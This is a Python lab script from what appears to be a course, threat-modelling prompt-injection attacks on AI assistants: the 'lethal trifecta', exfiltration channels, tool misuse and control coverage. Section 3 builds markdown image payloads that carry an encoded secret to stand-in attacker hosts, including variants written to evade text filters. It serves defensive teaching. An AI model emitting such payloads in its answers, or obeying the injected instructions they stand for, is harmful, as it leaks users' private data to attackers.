"""M10-L10 lab -- a threat model for an AI application. Measures:

  1. the dangerous combination: private data + untrusted content + a way out,
  2. exfiltration channels open in a given deployment, and what closes them,
  3. 25 crafted image-URL exfiltration payloads against four client designs,
  4. tool misuse: what an attacker reaches for three tool sets,
  5. control coverage across the attack path, and where the gaps are.

Nothing here attacks a real system: the payloads are strings compared against
local policy functions.
Deterministic. No API key, no network, no third-party dependencies.
Run:  python labs/m10/l10_security_threat_model.py
"""

from __future__ import annotations

import base64
import sys
from urllib.parse import urlsplit

sys.stdout.reconfigure(encoding="utf-8")


def rule(title: str) -> None:
    print(f"\n{'=' * 76}\n{title}\n{'=' * 76}")


# ============================================================ 1
rule("1. THE COMBINATION THAT MAKES AN ASSISTANT EXPLOITABLE")

SYSTEMS = {
    "public FAQ bot": (False, True, True),
    "internal doc search (read-only, no links rendered)": (True, True, False),
    "coding agent on a private repo, no network": (True, False, False),
    "support agent: tickets + customer data + email tool": (True, True, True),
    "email assistant reading external mail, can send": (True, True, True),
    "personal notes assistant, offline model": (True, False, False),
    "browser agent with access to logged-in sessions": (True, True, True),
    "batch summariser of internal docs, output to a file share": (True, False, True),
}
print(f"  {'system':<52}{'private':>9}{'untrusted':>11}{'egress':>8}   verdict")
exploitable = []
for name, (private, untrusted, egress) in SYSTEMS.items():
    danger = private and untrusted and egress
    if danger:
        exploitable.append(name)
    print(f"  {name[:50]:<52}{str(private):>9}{str(untrusted):>11}{str(egress):>8}   "
          f"{'EXPLOITABLE' if danger else 'one leg missing'}")
print(f"\n  {len(exploitable)}/{len(SYSTEMS)} systems have all three legs.")
print("  Removing ANY one leg breaks the chain: no private data to steal, no")
print("  attacker-controlled text to carry the instruction, or no way to get data out.")
print("  (This framing is often called the 'lethal trifecta' of agent security.)")


# ============================================================ 2
rule("2. WAYS OUT: THE CHANNELS AN ASSISTANT CAN LEAK THROUGH")

CHANNELS = {
    "markdown image auto-loaded by the client": "block remote images, or allowlist hosts",
    "link the user is invited to click": "render links inert; show the full URL",
    "tool call to an external HTTP API": "allowlist destinations; no generic fetch tool",
    "email/message send tool": "recipient allowlist; human approval",
    "file written to a shared location": "write only to per-user paths; review before share",
    "error message echoed to a third party": "generic errors; no data in error text",
    "citation URL with data in the query string": "strip query strings; canonical citation ids",
    "DNS lookup of an attacker-chosen hostname": "egress proxy; deny by default",
}
DEPLOYMENT_OPEN = {"markdown image auto-loaded by the client", "tool call to an external HTTP API",
                   "citation URL with data in the query string", "DNS lookup of an attacker-chosen hostname"}
for channel, mitigation in CHANNELS.items():
    state = "OPEN" if channel in DEPLOYMENT_OPEN else "closed"
    print(f"  [{state:<6}] {channel:<46} mitigation: {mitigation}")
print(f"\n  {len(DEPLOYMENT_OPEN)}/{len(CHANNELS)} channels open in this deployment.")
print("  Exfiltration needs only one. Enumerate them per deployment, because they")
print("  come from the client, the tools and the network, not from the model.")


# ============================================================ 3
rule("3. IMAGE-URL EXFILTRATION PAYLOADS AGAINST FOUR CLIENT DESIGNS")

SECRET = "customer-4471-balance-18422.55"
hosts = ["evil.example", "cdn.evil.example", "img.attacker.test", "tracker.example.net", "evil.example.co"]
payloads = []
for i, host in enumerate(hosts):
    b64 = base64.urlsafe_b64encode(SECRET.encode()).decode().strip("=")
    payloads += [
        f"![](https://{host}/pixel?d={b64})",
        f"![](https://{host}/{b64}.png)",
        f"![](https://{b64[:20].lower()}.{host}/x.png)",
        f"![alt](https://{host}/a.png#{b64})",
    ]
EVASIVE = [                                    # same data, encodings a text filter was not written for
    f"![](https://evil.example/p?d={SECRET.encode().hex()})",
    f"![](https://evil.example/p?d={'.'.join(SECRET[i:i + 6] for i in range(0, len(SECRET), 6))})",
    f"![](https://evil.example/a?d={SECRET[:15]}) and ![](https://evil.example/b?d={SECRET[15:]})",
    f"![](https://evil.example/p?d={SECRET.replace('-', '%2D').replace('.', '%2E')})",
    f"![](https://evil.example/p?d={''.join(chr(ord(c) + 1) for c in SECRET)})",
]
payloads += EVASIVE
ALLOWED_IMAGE_HOSTS = {"images.ourcompany.example", "cdn.ourcompany.example"}
SECRET_B64 = base64.urlsafe_b64encode(SECRET.encode()).decode().strip("=")


def renders(payload: str, policy: str) -> bool:
    """Does the client fetch a remote URL when showing this answer?"""
    url = payload[payload.index("(") + 1: payload.rindex(")")]
    host = urlsplit(url).hostname or ""
    if policy == "strip answers containing the secret":
        return not (SECRET in payload or SECRET_B64 in payload)     # a text filter, written against what was seen
    if policy == "auto-load anything":
        return True
    if policy == "allowlist of image hosts":
        return host in ALLOWED_IMAGE_HOSTS
    return False                                     # never auto-load remote images


for policy in ("auto-load anything", "strip answers containing the secret",
               "allowlist of image hosts", "no remote images"):
    leaked = sum(1 for p in payloads if renders(p, policy))
    print(f"  {policy:<36} payloads reaching the attacker: {leaked:>2}/{len(payloads)}")
print("\n  The payloads differ only in where and how the data hides: query string, path,")
print("  subdomain, fragment, hex, chunked, split across two images, shifted by one.")
print("  The text filter blocks what it has seen and misses the rest; refusing to")
print("  fetch attacker-chosen hosts blocks all of them without reading the data.")


# ============================================================ 4
rule("4. TOOL MISUSE: WHAT AN ATTACKER REACHES")

TOOLS = {
    "search_docs": {"reads": "internal docs", "writes": None, "external": False},
    "read_customer": {"reads": "customer records", "writes": None, "external": False},
    "issue_refund": {"reads": "orders", "writes": "money", "external": False},
    "send_email": {"reads": None, "writes": "outbound email", "external": True},
    "http_fetch": {"reads": "any URL", "writes": None, "external": True},
    "run_sql": {"reads": "whole database", "writes": "whole database", "external": False},
}
TOOLSETS = {
    "minimal": ["search_docs"],
    "support agent": ["search_docs", "read_customer", "issue_refund", "send_email"],
    "'power user' agent": ["search_docs", "read_customer", "issue_refund", "send_email", "http_fetch", "run_sql"],
}
for name, tools in TOOLSETS.items():
    reads = sorted({TOOLS[t]["reads"] for t in tools if TOOLS[t]["reads"]})
    writes = sorted({TOOLS[t]["writes"] for t in tools if TOOLS[t]["writes"]})
    external = [t for t in tools if TOOLS[t]["external"]]
    print(f"  {name:<20} reads: {', '.join(reads)}")
    print(f"  {'':<20} writes: {', '.join(writes) or 'nothing'};  ways out: {', '.join(external) or 'none'}")
print("\n  An injected instruction inherits the agent's tools. The question is never")
print("  'will the model be fooled?' but 'what can the fooled model reach?' (M9-L13).")


# ============================================================ 5
rule("5. CONTROL COVERAGE ACROSS THE ATTACK PATH")

STAGES = ["untrusted content enters", "model is influenced", "tool is called", "data leaves", "damage persists"]
CONTROLS = {
    "Delimit and label untrusted content (M5-L05)": ["untrusted content enters"],
    "Provenance on retrieved chunks (M7-L08)": ["untrusted content enters"],
    "Server-side authorization per call (M9-L13)": ["tool is called"],
    "Human approval for consequential actions (M8-L10)": ["tool is called"],
    "Destination allowlist / egress proxy (M9-L12)": ["data leaves"],
    "No remote image loading in the client": ["data leaves"],
    "Idempotency and limits (M8-L12, M8-L15)": ["damage persists"],
    "Audit log of tool calls (M10-L13)": ["damage persists"],
}
covered = {stage: [c for c, stages in CONTROLS.items() if stage in stages] for stage in STAGES}
for stage in STAGES:
    names = covered[stage]
    print(f"  {stage:<28} {len(names)} control(s): {'; '.join(n.split(' (')[0] for n in names) or 'NONE'}")
gaps = [s for s in STAGES if not covered[s]]
print(f"\n  stages with no control: {gaps or 'none'}")
print("  'Model is influenced' has no reliable control, and that is the point: assume")
print("  the model WILL be influenced, and put the controls either side of it.")


rule("6. WHAT THIS LAB IS AND IS NOT")
print("  REAL: every classification, channel count, payload result and coverage count")
print("  above is computed from the encoded configurations and policy functions.")
print("\n  ILLUSTRATIVE: the deployments, tool sets and payloads are hand-written")
print("  examples; no real client, model or network is involved.")
print("\n  NOT SHOWN: model-level defences and their measured limits (M5-L13), supply")
print("  chain attacks on models and packages, and incident response (M10-L14).")
print("\nDone.")
